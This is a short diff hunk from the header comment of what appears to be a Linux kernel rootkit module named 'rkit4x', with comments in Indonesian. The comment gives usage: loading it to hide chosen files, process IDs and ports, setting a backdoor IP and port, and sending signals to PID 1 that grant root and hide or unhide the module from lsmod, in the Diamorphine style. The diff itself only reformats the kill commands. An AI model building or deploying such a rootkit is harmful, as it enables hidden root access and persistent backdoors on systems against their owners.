@@ -5,9 +5,9 @@
  *   insmod rkit4x.ko hide="pages.php,rahasia.txt" hidepid="123" \
  *                     hideport="8080,4444" \
  *                     backdoor_ip=10.0.0.5 backdoor_port=4444
- *   kill -s63 1        -> root
- *   kill -s64 1        -> sembunyikan modul (lsmod kosong)
- *   kill -s62 1        -> tampilkan modul lagi (WAJIB sebelum rmmod)
+ *   kill -s 63 1       -> root
+ *   kill -s 64 1       -> sembunyikan modul (lsmod kosong)
+ *   kill -s 62 1       -> tampilkan modul lagi (WAJIB sebelum rmmod)
  *   rmmod rkit4x       -> kembalikan sys_call_table, semua bersih
  *
  * Kontrol era ini pakai SINYAL (gaya Diamorphine) karena tidak ada
